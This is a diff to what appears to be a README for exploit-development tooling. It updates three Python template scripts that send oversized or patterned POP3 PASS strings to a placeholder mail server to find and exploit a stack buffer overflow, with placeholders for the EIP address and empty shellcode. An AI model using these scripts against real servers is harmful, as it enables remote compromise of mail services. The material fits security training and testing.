@@ -179,12 +179,19 @@ Based on the above specified command line arguments, the triaging scripts will l
 from __future__ import print_function
 import socket
 
+def str2b(data):
+    """Python2/3 compat."""
+    try:
+        return data.encode('latin1')
+    except UnicodeDecodeError:
+        return data
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-len_total    = 2700               # Start at len_overflow and try out how much can be overwritten
-len_overflow = 2670               # Use pattern_create.rb and pattern_offset.rb to find exact offset
-len_nop_sled = 16                 # Add nops if you need to encode your shellcode
-eip          = "\x90\x90\x90\x90" # Change this (Keep in mind to put address in reverse order)
+len_total    = 2700                # Start at len_overflow and try out how much can be overwritten
+len_overflow = 2670                # Use pattern_create.rb and pattern_offset.rb to find exact offset
+len_nop_sled = 16                  # Add nops if you need to encode your shellcode
+eip          = "\x42\x42\x42\x42"  # Change this (Keep in mind to put address in reverse order)
 shellcode    = ""
 
 padding = "C"*(len_total - len_overflow - len(str(eip)) - len_nop_sled - len(shellcode))
@@ -194,11 +201,11 @@ print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(('USER test' + '\r\n').encode())
+    s.send(str2b('USER test' + '\r\n'))
     s.recv(1024)
-    s.send(('PASS ' + buffer + '' + '\r\n').encode())
+    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
     s.recv(1024)
-    s.send(('QUIT' + '\r\n').encode())
+    s.send(str2b('QUIT' + '\r\n'))
     print('done')
 except:
     print('Could not connect')
@@ -211,6 +218,13 @@ except:
 
 from __future__ import print_function
 import socket
+
+def str2b(data):
+    """Python2/3 compat."""
+    try:
+        return data.encode('latin1')
+    except UnicodeDecodeError:
+        return data
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -251,11 +265,11 @@ print('Trying to send %s bytes unique chars...' % (str(len(pattern))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(('USER test' + '\r\n').encode())
+    s.send(str2b('USER test' + '\r\n'))
     s.recv(1024)
-    s.send(('PASS ' + pattern + '' + '\r\n').encode())
+    s.send(str2b('PASS ' + pattern + '' + '\r\n'))
     s.recv(1024)
-    s.send(('QUIT' + '\r\n').encode())
+    s.send(str2b('QUIT' + '\r\n'))
     print('done')
 except:
     print('Could not connect')
@@ -268,6 +282,13 @@ except:
 
 from __future__ import print_function
 import socket
+
+def str2b(data):
+    """Python2/3 compat."""
+    try:
+        return data.encode('latin1')
+    except UnicodeDecodeError:
+        return data
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -298,11 +319,11 @@ print('Trying to send %s bytes buffer...' % (str(len(buffer))))
 try:
     s.connect(('mail.example.tld', 110))
     s.recv(1024)
-    s.send(('USER test' + '\r\n').encode())
+    s.send(str2b('USER test' + '\r\n'))
     s.recv(1024)
-    s.send(('PASS ' + buffer + '' + '\r\n').encode())
+    s.send(str2b('PASS ' + buffer + '' + '\r\n'))
     s.recv(1024)
-    s.send(('QUIT' + '\r\n').encode())
+    s.send(str2b('QUIT' + '\r\n'))
     print('done')
 except:
     print('Could not connect')
